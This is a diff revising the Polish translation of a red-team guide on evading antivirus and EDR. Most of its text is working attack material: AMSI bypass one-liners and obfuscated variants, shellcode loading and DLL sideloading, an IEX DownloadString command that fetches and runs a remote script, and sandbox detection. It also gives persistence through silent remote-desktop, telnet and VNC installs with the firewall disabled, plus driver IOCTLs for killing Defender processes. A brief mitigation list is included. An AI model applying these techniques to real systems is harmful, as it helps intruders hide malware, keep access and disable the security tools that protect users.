@@ -12,11 +12,11 @@
 
 ## **Metodologia unikania AV**
 
-Obecnie, AV używają różnych metod do sprawdzania, czy plik jest złośliwy, czy nie, w tym detekcji statycznej, analizy dynamicznej oraz, w przypadku bardziej zaawansowanych EDR, analizy behawioralnej.
+Obecnie, AV używają różnych metod do sprawdzania, czy plik jest złośliwy, czy nie, takich jak wykrywanie statyczne, analiza dynamiczna oraz, w przypadku bardziej zaawansowanych EDR, analiza behawioralna.
 
-### **Detekcja statyczna**
+### **Wykrywanie statyczne**
 
-Detekcja statyczna osiągana jest poprzez oznaczanie znanych złośliwych ciągów lub tablic bajtów w binarnym pliku lub skrypcie, a także przez wydobywanie informacji z samego pliku (np. opis pliku, nazwa firmy, podpisy cyfrowe, ikona, suma kontrolna itp.). Oznacza to, że używanie znanych publicznych narzędzi może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie zostały one przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na obejście tego rodzaju detekcji:
+Wykrywanie statyczne osiąga się poprzez oznaczanie znanych złośliwych ciągów lub tablic bajtów w binarnym pliku lub skrypcie, a także poprzez wydobywanie informacji z samego pliku (np. opis pliku, nazwa firmy, podpisy cyfrowe, ikona, suma kontrolna itp.). Oznacza to, że używanie znanych publicznych narzędzi może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie zostały one przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na obejście tego rodzaju wykrywania:
 
 - **Szyfrowanie**
 
@@ -24,14 +24,14 @@ Jeśli zaszyfrujesz plik binarny, nie będzie możliwości wykrycia twojego prog
 
 - **Obfuskacja**
 
-Czasami wystarczy zmienić kilka ciągów w swoim pliku binarnym lub skrypcie, aby przejść przez AV, ale może to być czasochłonne w zależności od tego, co próbujesz obfuskować.
+Czasami wystarczy zmienić kilka ciągów w twoim pliku binarnym lub skrypcie, aby przejść przez AV, ale może to być czasochłonne w zależności od tego, co próbujesz obfuskować.
 
 - **Niestandardowe narzędzia**
 
 Jeśli opracujesz własne narzędzia, nie będzie znanych złych sygnatur, ale zajmuje to dużo czasu i wysiłku.
 
 > [!TIP]
-> Dobrym sposobem na sprawdzenie detekcji statycznej Windows Defendera jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). W zasadzie dzieli plik na wiele segmentów, a następnie prosi Defendera o zeskanowanie każdego z nich indywidualnie, w ten sposób może dokładnie powiedzieć, jakie ciągi lub bajty są oznaczone w twoim pliku binarnym.
+> Dobrym sposobem na sprawdzenie wykrywania statycznego przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). W zasadzie dzieli plik na wiele segmentów, a następnie prosi Defendera o zeskanowanie każdego z nich indywidualnie, w ten sposób może dokładnie powiedzieć, jakie ciągi lub bajty są oznaczone w twoim pliku binarnym.
 
 Zdecydowanie polecam zapoznać się z tą [playlistą na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) na temat praktycznego unikania AV.
 
@@ -41,15 +41,15 @@ Analiza dynamiczna to sytuacja, gdy AV uruchamia twój plik binarny w piaskownic
 
 - **Sen przed wykonaniem** W zależności od tego, jak to jest zaimplementowane, może to być świetny sposób na ominięcie analizy dynamicznej AV. AV mają bardzo krótki czas na skanowanie plików, aby nie przerywać pracy użytkownika, więc używanie długich snów może zakłócić analizę plików binarnych. Problem polega na tym, że wiele piaskownic AV może po prostu pominąć sen, w zależności od tego, jak jest to zaimplementowane.
 - **Sprawdzanie zasobów maszyny** Zwykle piaskownice mają bardzo mało zasobów do pracy (np. < 2GB RAM), w przeciwnym razie mogłyby spowolnić maszynę użytkownika. Możesz być również bardzo kreatywny, na przykład sprawdzając temperaturę CPU lub nawet prędkości wentylatorów, nie wszystko będzie zaimplementowane w piaskownicy.
-- **Sprawdzanie specyficzne dla maszyny** Jeśli chcesz celować w użytkownika, którego stacja robocza jest podłączona do domeny "contoso.local", możesz sprawdzić domenę komputera, aby zobaczyć, czy pasuje do tej, którą określiłeś, jeśli nie, możesz sprawić, że twój program zakończy działanie.
+- **Sprawdzanie specyficzne dla maszyny** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest podłączona do domeny "contoso.local", możesz sprawdzić domenę komputera, aby zobaczyć, czy pasuje do tej, którą określiłeś, jeśli nie, możesz sprawić, że twój program zakończy działanie.
 
-Okazuje się, że nazwa komputera w piaskownicy Microsoft Defendera to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim złośliwym oprogramowaniu przed detonacją, jeśli nazwa pasuje do HAL9TH, oznacza to, że jesteś w piaskownicy defendera, więc możesz sprawić, że twój program zakończy działanie.
+Okazuje się, że nazwa komputera w piaskownicy Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim złośliwym oprogramowaniu przed detonacją, jeśli nazwa pasuje do HAL9TH, oznacza to, że jesteś w piaskownicy defendera, więc możesz sprawić, że twój program zakończy działanie.
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
 Kilka innych naprawdę dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących walki z piaskownicami
 
-<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanał #malware-dev</p></figcaption></figure>
+<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>
 
 Jak już wcześniej wspomniano w tym poście, **publiczne narzędzia** ostatecznie **zostaną wykryte**, więc powinieneś zadać sobie pytanie:
 
@@ -58,11 +58,11 @@ Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz używać mimi
 Prawidłowa odpowiedź to prawdopodobnie ta druga. Biorąc mimikatz jako przykład, prawdopodobnie jest to jeden z, jeśli nie najbardziej oznaczonych złośliwych programów przez AV i EDR, podczas gdy sam projekt jest super fajny, jest również koszmarem do pracy z nim, aby obejść AV, więc po prostu szukaj alternatyw dla tego, co próbujesz osiągnąć.
 
 > [!TIP]
-> Podczas modyfikowania swoich ładunków w celu unikania, upewnij się, że **wyłączyłeś automatyczne przesyłanie próbek** w defenderze, a proszę, poważnie, **NIE PRZESYŁAJ DO VIRUSTOTAL**, jeśli twoim celem jest osiągnięcie unikania w dłuższej perspektywie. Jeśli chcesz sprawdzić, czy twój ładunek jest wykrywany przez konkretne AV, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj tam, aż będziesz zadowolony z wyniku.
+> Podczas modyfikowania swoich ładunków w celu unikania, upewnij się, że **wyłączyłeś automatyczne przesyłanie próbek** w defenderze, a proszę, poważnie, **NIE WYSYŁAJ DO VIRUSTOTAL**, jeśli twoim celem jest osiągnięcie unikania w dłuższej perspektywie. Jeśli chcesz sprawdzić, czy twój ładunek jest wykrywany przez konkretne AV, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj tam, aż będziesz zadowolony z wyniku.
 
 ## EXE vs DLL
 
-Kiedy to możliwe, zawsze **priorytetuj używanie DLL do unikania**, z mojego doświadczenia, pliki DLL są zazwyczaj **znacznie mniej wykrywane** i analizowane, więc to bardzo prosty trik, aby uniknąć wykrycia w niektórych przypadkach (jeśli twój ładunek ma jakiś sposób uruchamiania jako DLL, oczywiście).
+Kiedy tylko to możliwe, zawsze **priorytetowo traktuj używanie DLL do unikania**, z mojego doświadczenia pliki DLL są zazwyczaj **znacznie mniej wykrywane** i analizowane, więc to bardzo prosty trik, aby uniknąć wykrycia w niektórych przypadkach (jeśli twój ładunek ma jakiś sposób uruchamiania jako DLL, oczywiście).
 
 Jak widać na tym obrazie, ładunek DLL z Havoc ma wskaźnik wykrycia 4/26 w antiscan.me, podczas gdy ładunek EXE ma wskaźnik wykrycia 7/26.
 
@@ -83,7 +83,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 ```
 To polecenie wyświetli listę programów podatnych na DLL hijacking w "C:\Program Files\\" oraz pliki DLL, które próbują załadować.
 
-Zalecam **samodzielne zbadanie programów podatnych na DLL Hijackable/Sideloadable**, ta technika jest dość dyskretna, jeśli jest wykonana prawidłowo, ale jeśli użyjesz publicznie znanych programów Sideloadable, możesz łatwo zostać złapanym.
+Zalecam **samodzielne zbadanie programów podatnych na DLL Hijackable/Sideloadable**, ta technika jest dość dyskretna, jeśli jest wykonana poprawnie, ale jeśli użyjesz publicznie znanych programów Sideloadable, możesz łatwo zostać złapany.
 
 Samo umieszczenie złośliwego DLL o nazwie, którą program oczekuje załadować, nie załaduje twojego ładunku, ponieważ program oczekuje pewnych specyficznych funkcji w tym DLL. Aby rozwiązać ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.
 
@@ -106,7 +106,7 @@ Ostatnie polecenie wygeneruje nam 2 pliki: szablon kodu źródłowego DLL oraz o
 ```
 <figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają wskaźnik wykrycia 0/26 w [antiscan.me](https://antiscan.me)! Można to uznać za sukces.
+Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają wskaźnik wykrycia 0/26 w [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.
 
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
@@ -117,7 +117,7 @@ Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci
 
 `Freeze to zestaw narzędzi do payloadów do omijania EDR-ów za pomocą wstrzymanych procesów, bezpośrednich wywołań systemowych i alternatywnych metod wykonania`
 
-Możesz użyć Freeze do załadowania i wykonania swojego shellcode w sposób dyskretny.
+Możesz użyć Freeze do załadowania i wykonania swojego shellcode w sposób ukryty.
 ```
 Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
 1. Generate some shellcode, in this case I used Havoc C2.
@@ -131,7 +131,7 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 
 ## AMSI (Interfejs Skanowania Antywirusowego)
 
-AMSI został stworzony, aby zapobiegać "[złośliwemu oprogramowaniu bezplikowemu](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo programy antywirusowe mogły skanować tylko **pliki na dysku**, więc jeśli w jakiś sposób mogłeś wykonać ładunki **bezpośrednio w pamięci**, program antywirusowy nie mógł nic zrobić, aby temu zapobiec, ponieważ nie miał wystarczającej widoczności.
+AMSI został stworzony, aby zapobiegać "[złośliwemu oprogramowaniu bezplikowemu](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo programy antywirusowe mogły skanować tylko **pliki na dysku**, więc jeśli udało ci się jakoś wykonać ładunki **bezpośrednio w pamięci**, program antywirusowy nie mógł nic zrobić, aby temu zapobiec, ponieważ nie miał wystarczającej widoczności.
 
 Funkcja AMSI jest zintegrowana z tymi komponentami systemu Windows.
 
@@ -141,7 +141,7 @@ Funkcja AMSI jest zintegrowana z tymi komponentami systemu Windows.
 - JavaScript i VBScript
 - Makra VBA w Office
 
-Pozwala to rozwiązaniom antywirusowym na inspekcję zachowania skryptów poprzez ujawnienie treści skryptu w formie, która jest zarówno niezaszyfrowana, jak i nieukryta.
+Umożliwia to rozwiązaniom antywirusowym inspekcję zachowania skryptów poprzez ujawnienie treści skryptu w formie, która jest zarówno niezaszyfrowana, jak i nieukryta.
 
 Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje wyświetlenie następującego alertu w Windows Defender.
 
@@ -167,7 +167,7 @@ Ponieważ AMSI jest implementowane przez załadowanie DLL do procesu powershell 
 
 **Wymuszenie błędu**
 
-Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że nie zostanie zainicjowane żadne skanowanie dla bieżącego procesu. Początkowo ujawnione przez [Matta Graebera](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec szerszemu użyciu.
+Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że żadne skanowanie nie zostanie zainicjowane dla bieżącego procesu. Początkowo ujawniono to przez [Matta Graebera](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec szerszemu użyciu.
 ```bash
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
@@ -187,11 +187,11 @@ $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
 $Spotfix.SetValue($null,$true)
 }Catch{Throw $_}
 ```
-Miej na uwadze, że to prawdopodobnie zostanie oznaczone, gdy ten post zostanie opublikowany, więc nie powinieneś publikować żadnego kodu, jeśli planujesz pozostać niezauważony.
+Miej na uwadze, że to prawdopodobnie zostanie oznaczone, gdy ten post zostanie opublikowany, więc nie powinieneś publikować żadnego kodu, jeśli twoim planem jest pozostanie niezauważonym.
 
 **Memory Patching**
 
-Ta technika została początkowo odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w amsi.dll (odpowiedzialnej za skanowanie dostarczonego przez użytkownika wejścia) i nadpisaniu go instrukcjami, które zwracają kod E_INVALIDARG, w ten sposób wynik rzeczywistego skanowania zwróci 0, co jest interpretowane jako czysty wynik.
+Ta technika została początkowo odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w amsi.dll (odpowiedzialnej za skanowanie dostarczonego przez użytkownika wejścia) i nadpisaniu go instrukcjami, aby zwrócić kod E_INVALIDARG, w ten sposób wynik rzeczywistego skanowania zwróci 0, co jest interpretowane jako czysty wynik.
 
 > [!TIP]
 > Proszę przeczytać [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) w celu uzyskania bardziej szczegółowego wyjaśnienia.
@@ -209,7 +209,7 @@ Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https:
 Możesz znaleźć listę produktów AV/EDR, które używają AMSI w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.
 
 **Use Powershell version 2**
-Jeśli używasz PowerShell w wersji 2, AMSI nie zostanie załadowany, więc możesz uruchamiać swoje skrypty bez skanowania przez AMSI. Możesz to zrobić:
+Jeśli używasz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać swoje skrypty bez skanowania przez AMSI. Możesz to zrobić:
 ```bash
 powershell.exe -version 2
 ```
@@ -226,7 +226,7 @@ Aby obejść rejestrowanie PowerShell, możesz użyć następujących technik:
 ## Obfuscation
 
 > [!TIP]
-> Kilka technik obfuskacji polega na szyfrowaniu danych, co zwiększy entropię binariów, co ułatwi AV i EDR ich wykrycie. Bądź ostrożny z tym i może zastosuj szyfrowanie tylko do konkretnych sekcji swojego kodu, które są wrażliwe lub muszą być ukryte.
+> Kilka technik obfuskacji polega na szyfrowaniu danych, co zwiększy entropię binariów, co ułatwi AV i EDR ich wykrycie. Uważaj na to i może zastosuj szyfrowanie tylko do konkretnych sekcji swojego kodu, które są wrażliwe lub muszą być ukryte.
 
 ### Deobfuscating ConfuserEx-Protected .NET Binaries
 
@@ -266,11 +266,11 @@ autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
 ---
 
 - [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
-- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie otwartoźródłowego forka zestawu kompilacyjnego [LLVM](http://www.llvm.org/), który ma na celu zwiększenie bezpieczeństwa oprogramowania poprzez [obfuskację kodu](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zabezpieczanie przed manipulacją.
-- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak używać języka `C++11/14` do generowania, w czasie kompilacji, obfuskowanego kodu bez użycia jakiegokolwiek zewnętrznego narzędzia i bez modyfikowania kompilatora.
+- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie otwartoźródłowego forka zestawu kompilacji [LLVM](http://www.llvm.org/), który ma na celu zwiększenie bezpieczeństwa oprogramowania poprzez [obfuskację kodu](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zabezpieczanie przed manipulacją.
+- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak używać języka `C++11/14` do generowania, w czasie kompilacji, obfuskowanego kodu bez użycia jakiegokolwiek zewnętrznego narzędzia i bez modyfikacji kompilatora.
 - [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuskowanych operacji generowanych przez framework metaprogramowania szablonów C++, co utrudni życie osobie chcącej złamać aplikację.
 - [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuscator binarny x64, który potrafi obfuskować różne pliki pe, w tym: .exe, .dll, .sys
-- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorficznego dla dowolnych plików wykonywalnych.
+- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorfnego dla dowolnych plików wykonywalnych.
 - [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to framework obfuskacji kodu o wysokiej precyzji dla języków wspieranych przez LLVM, wykorzystujący ROP (programowanie oparte na zwrotach). ROPfuscator obfuskowuje program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP, co zakłóca nasze naturalne postrzeganie normalnego przepływu sterowania.
 - [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
 - [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi przekształcić istniejące EXE/DLL w shellcode, a następnie je załadować.
@@ -283,7 +283,7 @@ Microsoft Defender SmartScreen to mechanizm zabezpieczeń mający na celu ochron
 
 <figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreen działa głównie na podstawie podejścia opartego na reputacji, co oznacza, że rzadko pobierane aplikacje uruchomią SmartScreen, co ostrzeże i uniemożliwi użytkownikowi końcowemu uruchomienie pliku (chociaż plik można nadal uruchomić, klikając Więcej informacji -> Uruchom mimo to).
+SmartScreen działa głównie na podstawie podejścia opartego na reputacji, co oznacza, że rzadko pobierane aplikacje uruchomią SmartScreen, co spowoduje powiadomienie i uniemożliwienie użytkownikowi końcowemu uruchomienia pliku (chociaż plik można nadal uruchomić, klikając Więcej informacji -> Uruchom mimo to).
 
 **MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony po pobraniu plików z internetu, wraz z adresem URL, z którego został pobrany.
 
@@ -292,7 +292,7 @@ SmartScreen działa głównie na podstawie podejścia opartego na reputacji, co 
 > [!TIP]
 > Ważne jest, aby zauważyć, że pliki wykonywalne podpisane **zaufanym** certyfikatem podpisu **nie uruchomią SmartScreen**.
 
-Bardzo skutecznym sposobem na zapobieganie oznaczaniu twoich ładunków Mark of The Web jest pakowanie ich w jakiś rodzaj kontenera, takiego jak ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być stosowane do **woluminów nie NTFS**.
+Bardzo skutecznym sposobem na zapobieganie oznaczaniu twoich ładunków Mark of The Web jest pakowanie ich w jakiś rodzaj kontenera, takiego jak ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być stosowane do **wolumenów non NTFS**.
 
 <figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>
 
@@ -334,7 +334,7 @@ Więcej informacji można znaleźć w **[https://blog.xpnsec.com/hiding-your-dot
 
 ## C# Assembly Reflection
 
-Ładowanie binariów C# w pamięci jest znane od dłuższego czasu i wciąż jest to bardzo dobry sposób na uruchamianie narzędzi post-exploitation bez wykrycia przez AV.
+Ładowanie binarnych plików C# w pamięci jest znane od dłuższego czasu i wciąż jest to bardzo dobry sposób na uruchamianie narzędzi post-exploitation bez wykrycia przez AV.
 
 Ponieważ ładunek będzie ładowany bezpośrednio do pamięci bez dotykania dysku, będziemy musieli martwić się tylko o patchowanie AMSI dla całego procesu.
 
@@ -348,7 +348,7 @@ Polega to na **uruchomieniu nowego procesy ofiarnego**, wstrzyknięciu złośliw
 
 - **Inline**
 
-Chodzi o wstrzyknięcie złośliwego kodu post-exploitation **do własnego procesu**. W ten sposób możesz uniknąć tworzenia nowego procesu i skanowania go przez AV, ale wadą jest to, że jeśli coś pójdzie źle z wykonaniem twojego ładunku, istnieje **dużo większa szansa** na **utracenie swojego beacona**, ponieważ może on się zawiesić.
+Chodzi o wstrzyknięcie złośliwego kodu post-exploitation **do własnego procesu**. W ten sposób możesz uniknąć tworzenia nowego procesu i skanowania go przez AV, ale wadą jest to, że jeśli coś pójdzie źle z wykonaniem twojego ładunku, istnieje **dużo większa szansa** na **utratę twojego beacona**, ponieważ może on się zawiesić.
 
 <figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>
 
@@ -361,13 +361,13 @@ Możesz również ładować zestawy C# **z PowerShell**, sprawdź [Invoke-SharpL
 
 Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu przy użyciu innych języków, dając skompromitowanej maszynie dostęp **do środowiska interpretera zainstalowanego na udziale SMB kontrolowanym przez atakującego**.
 
-Umożliwiając dostęp do binariów interpretera i środowiska na udziale SMB, możesz **wykonywać dowolny kod w tych językach w pamięci** skompromitowanej maszyny.
+Umożliwiając dostęp do binarnych plików interpretera i środowiska na udziale SMB, możesz **wykonywać dowolny kod w tych językach w pamięci** skompromitowanej maszyny.
 
 Repozytorium wskazuje: Defender nadal skanuje skrypty, ale korzystając z Go, Java, PHP itp. mamy **więcej elastyczności w omijaniu statycznych sygnatur**. Testowanie losowych, nieobfuskowanych skryptów reverse shell w tych językach okazało się skuteczne.
 
 ## TokenStomping
 
-Token stomping to technika, która pozwala atakującemu na **manipulację tokenem dostępu lub produktem zabezpieczającym, takim jak EDR lub AV**, co pozwala im na obniżenie jego uprawnień, aby proces nie umierał, ale nie miał uprawnień do sprawdzania złośliwych działań.
+Token stomping to technika, która pozwala atakującemu na **manipulację tokenem dostępu lub produktem zabezpieczającym, takim jak EDR lub AV**, co pozwala im na obniżenie jego uprawnień, aby proces nie umarł, ale nie miał uprawnień do sprawdzania złośliwych działań.
 
 Aby temu zapobiec, Windows mógłby **zapobiec zewnętrznym procesom** uzyskiwania uchwytów do tokenów procesów zabezpieczających.
 
@@ -379,8 +379,8 @@ Aby temu zapobiec, Windows mógłby **zapobiec zewnętrznym procesom** uzyskiwan
 
 ### Chrome Remote Desktop
 
-Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest po prostu wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia go i utrzymania trwałości:
-1. Pobierz z https://remotedesktop.google.com/, kliknij "Skonfiguruj przez SSH", a następnie kliknij plik MSI dla systemu Windows, aby pobrać plik MSI.
+Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest po prostu zainstalować Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia go i utrzymania trwałości:
+1. Pobierz z https://remotedesktop.google.com/, kliknij "Skonfiguruj przez SSH", a następnie kliknij plik MSI dla Windows, aby pobrać plik MSI.
 2. Uruchom instalator w trybie cichym na ofierze (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
 3. Wróć do strony Chrome Remote Desktop i kliknij dalej. Kreator poprosi cię o autoryzację; kliknij przycisk Autoryzuj, aby kontynuować.
 4. Wykonaj podany parametr z pewnymi dostosowaniami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Zauważ parametr pin, który pozwala ustawić pin bez użycia GUI).
@@ -397,7 +397,7 @@ Zachęcam cię do obejrzenia tego wystąpienia od [@ATTL4S](https://twitter.com/
 https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
 {{#endref}}
 
-To również kolejne świetne wystąpienie od [@mariuszbit](https://twitter.com/mariuszbit) na temat ewazji w głębi.
+To również kolejne świetne wystąpienie od [@mariuszbit](https://twitter.com/mariuszbit) na temat ewazji w głębokości.
 
 {{#ref}}
 https://www.youtube.com/watch?v=IbA7Ung39o4
@@ -420,7 +420,7 @@ Uruchom to **przy starcie** systemu i **uruchom** to teraz:
 ```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
-**Zmień port telnet** (stealth) i wyłącz zaporę:
+**Zmień port telnet** (ukryty) i wyłącz zaporę:
 ```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
@@ -429,7 +429,7 @@ netsh advfirewall set allprofiles state off
 
 Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (chcesz pobrać pliki binarne, a nie instalator)
 
-**NA GOSPODARZU**: Wykonaj _**winvnc.exe**_ i skonfiguruj serwer:
+**NA GOSPODARZU**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:
 
 - Włącz opcję _Disable TrayIcon_
 - Ustaw hasło w _VNC Password_
@@ -443,9 +443,9 @@ Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik 
 
 **OSTRZEŻENIE:** Aby zachować dyskrecję, musisz unikać kilku rzeczy
 
-- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywołasz [popup](https://i.imgur.com/1SROTTl.png). sprawdź, czy działa za pomocą `tasklist | findstr winvnc`
-- Nie uruchamiaj `winvnc` bez `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [okna konfiguracyjnego](https://i.imgur.com/rfMQWcf.png)
-- Nie uruchamiaj `winvnc -h` w celu uzyskania pomocy, bo wywołasz [popup](https://i.imgur.com/oc18wcu.png)
+- Nie uruchamiaj `winvnc`, jeśli już działa, ponieważ spowoduje to wywołanie [popupu](https://i.imgur.com/1SROTTl.png). sprawdź, czy działa, używając `tasklist | findstr winvnc`
+- Nie uruchamiaj `winvnc` bez `UltraVNC.ini` w tym samym katalogu, ponieważ spowoduje to otwarcie [okna konfiguracyjnego](https://i.imgur.com/rfMQWcf.png)
+- Nie uruchamiaj `winvnc -h` w celu uzyskania pomocy, ponieważ spowoduje to wywołanie [popupu](https://i.imgur.com/oc18wcu.png)
 
 ### GreatSCT
 
@@ -471,7 +471,7 @@ Teraz **uruchom lister** za pomocą `msfconsole -r file.rc` i **wykonaj** **ład
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
-**Aktualny defender bardzo szybko zakończy proces.**
+**Obecny defender bardzo szybko zakończy proces.**
 
 ### Kompilacja naszego własnego reverse shell
 
@@ -641,7 +641,7 @@ Pierwsza linia rejestruje sterownik jako **usługę jądra**, a druga uruchamia 
 |-----------:|-----------------------------------------|
 | `0x99000050` | Zakończ dowolny proces po PID (używane do zabijania usług Defender/EDR) |
 | `0x990000D0` | Usuń dowolny plik na dysku |
-| `0x990001D0` | Załaduj sterownik i usuń usługę |
+| `0x990001D0` | Wyładuj sterownik i usuń usługę |
 
 Minimalny dowód koncepcji w C:
 ```c
@@ -659,26 +659,26 @@ return 0;
 
 Wykrywanie / Łagodzenie
 •  Włącz listę blokowania wrażliwych sterowników Microsoftu (`HVCI`, `Smart App Control`), aby Windows odmówił załadowania `AToolsKrnl64.sys`.
-•  Monitoruj tworzenie nowych *usług* jądra i powiadamiaj, gdy sterownik jest ładowany z katalogu zapisywalnego przez świat lub nie znajduje się na liście dozwolonych.
+•  Monitoruj tworzenie nowych *usług* jądra i powiadamiaj, gdy sterownik jest ładowany z katalogu zapisywalnego przez wszystkich lub nie znajduje się na liście dozwolonych.
 •  Obserwuj uchwyty w trybie użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.
 
-### Ominięcie Kontroli Postury Klienta Zscaler poprzez Modyfikację Binariów na Dysku
+### Obejście Kontroli Postury Klienta Zscaler za pomocą Łatania Binariów na Dysku
 
-**Client Connector** Zscalera stosuje zasady postury urządzenia lokalnie i polega na Windows RPC, aby komunikować wyniki innym komponentom. Dwa słabe wybory projektowe umożliwiają pełne ominięcie:
+**Client Connector** Zscalera stosuje zasady postury urządzenia lokalnie i polega na Windows RPC, aby komunikować wyniki innym komponentom. Dwa słabe wybory projektowe umożliwiają pełne obejście:
 
 1. Ocena postury odbywa się **całkowicie po stronie klienta** (boolean jest wysyłany do serwera).
-2. Wewnętrzne punkty końcowe RPC tylko weryfikują, że łączący się plik wykonywalny jest **podpisany przez Zscaler** (poprzez `WinVerifyTrust`).
